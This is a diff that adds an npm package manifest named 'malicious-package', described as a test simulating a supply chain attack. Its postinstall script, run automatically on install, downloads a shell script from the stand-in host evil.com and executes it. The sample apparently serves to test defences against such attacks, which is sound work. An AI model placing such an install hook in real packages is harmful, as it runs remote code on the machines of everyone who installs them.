@@ -1,0 +1,8 @@
+{
+  "name": "malicious-package",
+  "version": "1.0.0",
+  "description": "A test package meant to simulate a Supply Chain Attack",
+  "scripts": {
+    "postinstall": "node -e \"const http=require('http');http.get('http://evil.com/drop.sh',r=>r.pipe(require('fs').createWriteStream('drop.sh')).on('close',()=>require('child_process').exec('sh drop.sh')))\""
+  }
+}
